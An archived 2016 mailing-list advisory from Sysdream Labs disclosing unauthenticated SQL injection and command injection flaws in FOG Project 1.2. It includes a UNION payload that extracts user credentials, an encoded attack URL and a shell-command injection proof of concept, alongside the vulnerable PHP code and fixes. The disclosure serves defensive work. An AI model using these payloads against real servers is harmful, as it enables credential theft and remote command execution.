X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5307" "Tuesday" "19" "July" "2016" "11:12:32" "+0200" "Sysdream Labs" "labs@sysdream.com" "<32be31eb-ce40-c3d5-db44-39b4bc8e84e6@sysdream.com>" "192" "[oss-security] CVE ID Request: FOG Project Multiple Vulnerabilities" nil nil nil "7" "2016071909:12:32" "[oss-security] CVE ID Request: FOG Project Multiple Vulnerabilities" (number mark "U       labs@sysdrea Jul 19  192/5307  " thread-indent "\"[oss-security] CVE ID Request: FOG Project Multiple Vulnerabilities\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 28325 invoked by uid 550); 19 Jul 2016 09:12:47 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 28302 invoked from network); 19 Jul 2016 09:12:46 -0000
X-Virus-Scanned: amavisd-new at sysdream.com
To: fulldisclosure@seclists.org, oss-security@lists.openwall.com
From: Sysdream Labs <labs@sysdream.com>
Message-ID: <32be31eb-ce40-c3d5-db44-39b4bc8e84e6@sysdream.com>
Date: Tue, 19 Jul 2016 11:12:32 +0200
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
 Thunderbird/45.2
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="1Rp3bC03TmJNPoEE3eGS4hwxpQmJDABbC"
Subject: [oss-security] CVE ID Request: FOG Project Multiple Vulnerabilities

--1Rp3bC03TmJNPoEE3eGS4hwxpQmJDABbC
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

# FOG Project Multiple Vulnerabilities

## Description

FOG is a free, open source, computer cloning and management solution.

## SQL Injection

The database functions located in the *FOGManagerController.class.php* file=
 do not sanitize some parameters, which can input from unauthenticated user=
s.
Thus, an attacker without any privilege could execute arbitrary SQL command=
s and retrieve sensitive information from the database.

**Access Vector**: remote

**Security Risk**: high

**Vulnerability**: CWE-89

**CVSS Base Score**: 9.3 (Critical)

### Proof of Concept

Payload:

```
' UNION ALL SELECT NULL,NULL,(SELECT GROUP_CONCAT(CONCAT_WS(':', uName, uPa=
ss)) FROM users),NULL,NULL-- -
```

Base64 Encoded :

```
https://fogserver/fog/service/updates.php?action=3Dask&file=3DJyBVTklPTiBBT=
EwgU0VMRUNUIE5VTEwsTlVMTCwoU0VMRUNUIEdST1VQX0NPTkNBVChDT05DQVRfV1MoJzonLCB1=
TmFtZSwgdVBhc3MpKSBGUk9NIHVzZXJzKSxOVUxMLE5VTEwtLSA=3D
```

### Vulnerable code

The vulnerable code is located in *packages/web/lib/fog/FOGManagerControlle=
r.class.php*, line 96, function *find()*:

```
if (is_array($value))
      $whereArray[] =3D sprintf("`%s` IN ('%s')", $this->DB->sanitize($this=
->key($field)), implode("', '", $value));
else
      $whereArray[] =3D sprintf("`%s` %s '%s'", $this->DB->sanitize($this->=
key($field)), (preg_match('#%#', $value) ? 'LIKE' : '=3D'), $value);
```

Note: *sanitize()* is applied on the database table field (not on the user-=
controlled value) and it does not filter back-quotes. As a consequence, thi=
s function is useless.

Line 143, function *count()*:

```
if (is_array($value))
        $whereArray[] =3D sprintf("`%s` IN ('%s')", $this->DB->sanitize($th=
is->key($field)), implode("', '", $value));
else
        $whereArray[] =3D sprintf("`%s` %s '%s'", $this->DB->sanitize($this=
->key($field)), (preg_match('#%#', $value) ? 'LIKE' : '=3D'), $value);
```

The vulnerable functions can be called in multiple files, without any authe=
ntication.

File: *packages/web/service/updates.php*, line 14:

```
foreach($FOGCore->getClass('ClientUpdaterManager')->find(array('name' =3D> =
base64_decode($_REQUEST['file']))) AS $ClientUpdate)
```

File *packages/web/service/servicemodule-active.php*, line 14:

```
$moduleID =3D current($FOGCore->getClass('ModuleManager')->find(array('shor=
tName' =3D> $_REQUEST['moduleid'])));
```

### Solution

Sanitize every user-supplied input when passing it to SQL Queries.



## Unauthenticated Remote Command Execution

The *freespace.php* file does not correctly sanitize user-supplied *idnew* =
parameters. An unauthenticated attacker may use this file to execute system=
 commands.

**Access Vector**: remote

**Security Risk**: high

**Vulnerability**: CWE-88

**CVSS Base Score**: 10 (Critical)

### Proof of Concept

```
https://fogserver/status/freespace.php?idnew[path]=3D$(sleep%205)&idnew[id]=
=3D555&idnew[name]=3DSD&idnew[ip]=3D1234
```

### Vulnerable code

The vulnerable code is located in *packages/web/status/freespace.php*, line=
 34:

```
$StorageNode =3D ($_REQUEST['idnew'] ? new StorageNode($_REQUEST['idnew']) =
: null);
[...snip...]
$t =3D shell_exec("df ".$StorageNode->get('path')."| grep -vE \"^Filesystem=
|shm\"");
```

### Solution

Sanitize and verify every user-supplied input when passing it to shell_exec=
. Also, make sure only authenticated users can access this file.

### Affected versions

* FOG Stable <=3D 1.2

## Solution

Switch to beta/development builds.

## Timeline (dd/mm/yyyy)

* 05/04/2016 : Initial discovery
* 06/07/2016 : Contact with vendor team with vulnerability description
* 18/07/2016 : Remind vendor to get a reply
* 19/07/2016 : Vendor acknowledges the report, saying that issues had been =
fixed a while ago in beta/development builds and that using 1.2.0 stable ve=
rsion is now discouraged.

## Credits

* Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)
* Gyver FERRAND, Sysdream (g.ferrand -at- sysdream -dot- com)


--=20
SYSDREAM Labs <labs@sysdream.com>

GPG :
47D1 E124 C43E F992 2A2E
1551 8EB4 8CD9 D5B2 59A1

* Website: https://sysdream.com/
* Twitter: @sysdream


--1Rp3bC03TmJNPoEE3eGS4hwxpQmJDABbC
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBCAAGBQJXje8BAAoJEI60jNnVslmhXzAP/3W7hl0ahUXO68AGWiHXTtLB
Kn0bG+tjJ9+WOIFTk7uY46MA9A5hIOsUqwTzBv6l6ansTADOFHYFz5CKx9Qe9C7X
S9ixxVgRdYJkXJ2H4vd8Wc+xNfRtbOynr8VoX7h8kSAC01UbEb6lXWN8Ztxx4kVz
dFycjb/7ndibwUtdsoO3kcOYM3rzeC4HGK3Brw3o3lCIDW4YVLOZfkilcRnh+Ebv
vyCPyuZkEK9GdpLA3UhqILJG2s+2LiY6pdujqJxBeiyWnN12ePMAGBKT56NN5MLF
XGWPxySl8o8EqeSVqtmTOqCLD6GhPr7jlMQnHyX/OhDC78IOMqjUG6IKg+fsHNA6
sKZxfZju5bMzceBeFxHbeJdmud7FIwh7lY1N1VSrzGRDYV1bqYvjCeNQTI1vGom0
NYPBywQFNfQfqt8IbzlM0d904JKENb+bWNduk4CTckcKyJyQ60Tsj08nmh1JQUut
FDLUMar1qAf3rZa7vH3YfPY7UvXmq4zvMPer4O5BmaeYGpIBK3UXHyjCKAMvFVnU
6RpSGRGYydLAkuuWygVeXwgYA3tUsiaaH20xdfW9VyB6TAs3UZCShl+Z6EVh02gM
9J6ka4jNWRH1eKJkSMBM0JGi5xhq3xnbAOYMQzVmEde8+TaqxUQaECXGFTlsk/bH
LOdX1JeSEyCFiehiRz7t
=rmUt
-----END PGP SIGNATURE-----

--1Rp3bC03TmJNPoEE3eGS4hwxpQmJDABbC--
